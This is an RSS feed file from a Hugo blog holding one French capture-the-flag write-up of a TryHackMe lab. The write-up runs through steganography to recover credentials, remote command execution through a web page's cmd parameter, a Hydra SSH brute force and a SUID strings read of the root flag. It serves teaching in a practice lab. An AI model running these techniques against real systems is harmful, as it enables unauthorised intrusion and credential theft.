@@ -1,0 +1,170 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on ezekiel&#39;s blog</title>
+        <link>https://blog.hugoblanc.com/posts/</link>
+        <description>Recent content in Posts on ezekiel&#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 06 Jul 2020 22:58:18 +0200</lastBuildDate>
+        <atom:link href="https://blog.hugoblanc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Jack-Of-All-Trade // Write-up</title>
+            <link>https://blog.hugoblanc.com/posts/jack-writeup/</link>
+            <pubDate>Mon, 06 Jul 2020 22:58:18 +0200</pubDate>
+            
+            <guid>https://blog.hugoblanc.com/posts/jack-writeup/</guid>
+            <description>Cette room est sur Try Hack Me. Elle est dans la catégorie &amp;ldquo;Easy&amp;rdquo;.
+Synopsis de la room :
+ Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems&amp;hellip; We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?</description>
+            <content type="html"><![CDATA[<p>Cette room est sur <a href="https://tryhackme.com">Try Hack Me</a>. Elle est dans la catégorie &ldquo;Easy&rdquo;.</p>
+<p>Synopsis de la room :</p>
+<blockquote>
+<p>Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems&hellip; We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?</p>
+</blockquote>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>D&rsquo;abord, je scan les ports avec nmap :
+<code>nmap -sV -sC &lt;ip&gt; -oN ports.txt</code></p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 15:58 CEST
+Nmap scan report for 10.10.35.82
+Host is up (0.068s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Jack-of-all-trades!
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
+|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
+|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
+|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.67 seconds
+</code></pre><p>On remarque que le serveur Apache est sur le port 22, et SSH sur le 80 !</p>
+<p>Un fois sur la page du site, je regarde le code source, et je vois les commentaires suivants :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --&gt;</span>
+<span style="color:#75715e">&lt;!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --&gt;</span>
+</code></pre></div><p>C&rsquo;est du base64. une fois décodée, elle donne :</p>
+<blockquote>
+<p>Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [edited]</p>
+</blockquote>
+<p>Nous avons donc une nouvelle page, <code>/recovery.php</code>, ainsi qu&rsquo;un password.</p>
+<p><code>/recovery.php</code> contient un formulaire de connexion. Dans le code source de la page, il y a la string suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  --&gt;</span>
+</code></pre></div><p>Ce n&rsquo;est pas du base64. Avec un peu de tatonnage, je trouve : base32 -&gt; hex -&gt; ROT13.</p>
+<blockquote>
+<p>Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here&rsquo;s a hint: bit.ly/2TvYQ2S</p>
+</blockquote>
+<p>Le lien pointe vers la page Wikipédia du stégosaure.</p>
+<p>On dirait qu&rsquo;il va falloir faire de la stégano :)</p>
+<p>Sur la homepage, il y a une photo d&rsquo;un stégosaure. Je la télécharge et l&rsquo;examine avec <code>steghide</code> :</p>
+<pre><code>$ steghide info stego.jpg 
+&quot;stego.jpg&quot;:
+  format: jpeg
+  capacité: 1,9 KB
+</code></pre><p>Il y a donc bien des choses à l&rsquo;intérieur !
+J&rsquo;extrais le contenu grâce au mot de passe trouvé précédemement :</p>
+<pre><code>$ steghide extract -sf stego.jpg
+Entrez la passphrase: 
+Écriture des données extraites dans &quot;creds.txt&quot;.
+</code></pre><p>et regarde le contenu du fichier creds.txt :</p>
+<pre><code>$ cat creds.txt
+Hehe. Gotcha!
+
+You're on the right path, but wrong image!
+</code></pre><p>:'(</p>
+<p>Je télécharge donc la seconde image, jackinthebox.jpg, et répète le processus. Cependant, la passphrase utilisée précédement n&rsquo;est pas la bonne. Bizarre&hellip;
+J&rsquo;essaie quelques passwords un peu au hasard, mais rien ne semble fonctionner.</p>
+<p>Je décide d&rsquo;aller voir un peu ailleurs sur le site, et vais donc sur <code>/assets/</code>. Surprise, il y a 3 photos sur la homepage, j&rsquo;avais oublié la bannière ! Bien évidement, elle contient du texte qui peut être extrait avec le pass vu précédement.</p>
+<pre><code>$ steghide extract -sf header.jpg 
+Entrez la passphrase: 
+Écriture des données extraites dans &quot;cms.creds&quot;.
+</code></pre><p>J&rsquo;inspecte le contenu, il y a bien des creds !</p>
+<pre><code>$ cat cms.creds 
+Here you go Jack. Good thing you thought ahead!
+
+Username: [edited]
+Password: [edited]
+</code></pre><p>Une fois ces identifiants rentrés sur la page <code>/recovery.php</code>, j&rsquo;accède à une nouvelle page, avec pour seul message :</p>
+<pre><code>GET me a 'cmd' and I'll run it for you Future-Jack. 
+</code></pre><p>Rien de plus dans le code source. Le message est plutôt clair : il faut effectuer des requêtes GET sur la page avec des commandes en paramètre.
+Je rentre donc en URL <code>http://10.10.35.82:22/[edited]?cmd=whoami</code> afin de tester. J&rsquo;ai bien la réponse à la commande : <code>www-data</code>.</p>
+<p>Du RCE ! :D</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Tout d&rsquo;abord, j&rsquo;essaie de voir si je peux regarder le contenu de <code>/home</code>:</p>
+<p><code>http://10.10.35.82:22/[edited]?cmd=ls%20/home</code></p>
+<p>J&rsquo;y trouve un fichier : <code>jacks_password_list</code> ainsi que le dossier de l&rsquo;user jack.
+Je récupère le fichier en envoyant <code>cat /home/jacks_password_list</code> :</p>
+<pre><code>*hclqAzj+2GC+=0K eN@ 0HguX{,fgXPE;8yF sjRUb4*@pz&lt;*ZITu [8V7o^gl(Gjt5[WB yTq0jI$d}Kae)vC4} 9;}#q*,A4wd{6r,y4krSo ow5APF&gt;6r,y4krSo
+</code></pre><p>Puisque ce fichier est sensé être une liste, j&rsquo;imagine que chaque espace représente un retour à la ligne. Ca donnerait donc :</p>
+<pre><code>*hclqAzj+2GC+=0K
+eN@
+0HguX{,fgXPE;8yF
+sjRUb4*@pz&lt;*ZITu
+[8V7o^gl(Gjt5[WB
+yTq0jI$d}Kae)vC4}
+9;}#q*,A4wd{6r,y4krSo
+ow5APF&gt;6r,y4krSo
+</code></pre><p>Ce format ne me dit absolument rien.</p>
+<p>Je me dis qu&rsquo;un de ces mots de passe est celui du SSH de Jack. J&rsquo;essaie donc de bruteforce le port avec Hydra et les passwords mis dans un .txt</p>
+<pre><code>$ hydra -l jack -P passlist.txt 10.10.35.82 ssh -s 80
+...
+[DATA] attacking ssh://10.10.35.82:80/
+1 of 1 target completed, 0 valid passwords found
+</code></pre><p>Rien &hellip;
+Petit coup d&rsquo;oeil au code source de la page, et je remarque qu&rsquo;il n&rsquo;y a qu&rsquo;une petite partie de la liste qui est affichée ! La liste de mots de passe est en réalité beaucoup plus longue.</p>
+<p>J&rsquo;édite donc ma liste et retente avec Hydra.</p>
+<pre><code>[DATA] attacking ssh://10.10.35.82:80/
+[80][ssh] host: 10.10.35.82   login: jack   password: [edited]
+1 of 1 target successfully completed, 1 valid password found
+</code></pre><p>Cette fois c&rsquo;est la bonne ! Me voilà connecté en SSH sur la machine.</p>
+<p>Dans le folder de jack, il n&rsquo;y a qu&rsquo;une photo : <code>user.jpg</code>.</p>
+<p>Je la récupère sur ma machine : <code>scp -P 80 jack@10.10.35.82:user.jpg</code> et l&rsquo;ouvre : <code>eog user.jpg</code>.</p>
+<p>Bingo, elle contient le premier flag !</p>
+<h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
+<p>Le but maintenant est de passer root.
+J&rsquo;essaie de voir ce que je peux lancer en tant que superuser:</p>
+<pre><code>$ sudo -l
+[sudo] password for jack: 
+Sorry, user jack may not run sudo on jack-of-all-trades.
+</code></pre><p>Tant pis pour sudo&hellip; Je regarde ensuite si des fichiers ont le bit SUID de réglé :</p>
+<pre><code>$ find / -perm /4000 2&gt; /dev/null 
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/strings
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/sbin/exim4
+/bin/mount
+/bin/umount
+/bin/su
+</code></pre><p><code>/usr/bin/strings</code> ! Parfait ! Je vais pouvoir lire le flag :)</p>
+<p>On sait que le flag root est à <code>/root/root.txt</code>. Il faut donc faire :</p>
+<pre><code>$ LFILE=/root/root.txt
+$ /usr/bin/strings &quot;$LFILE&quot;
+</code></pre><p>et voilà le résultat :</p>
+<pre><code>ToDo:
+1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny for a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract for Lisa.
+6.Delete this: [edited]
+</code></pre><p>C&rsquo;est dans la poche 8-)</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
